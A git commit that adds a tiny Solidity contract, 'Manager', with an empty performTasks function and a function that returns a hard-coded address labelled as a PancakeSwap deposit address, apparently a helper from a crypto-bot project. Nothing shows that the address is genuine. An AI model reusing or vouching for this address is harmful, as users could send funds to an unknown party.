888f76e6eaa2c74b7b746ed42b58aaf1a44ab0cc
crazyrajat <rjt.crazy@gmail.com>
2021-07-11 16:03:54 +0530

    Create nothing.sol

---
+++ nothing.sol
@@ -0,0 +1,12 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeswapDepositAddress() public pure returns (address) {
+		return 0x73769a959F21b35Ed3E7ACc076056f0421e53AbF;
+	}
+}
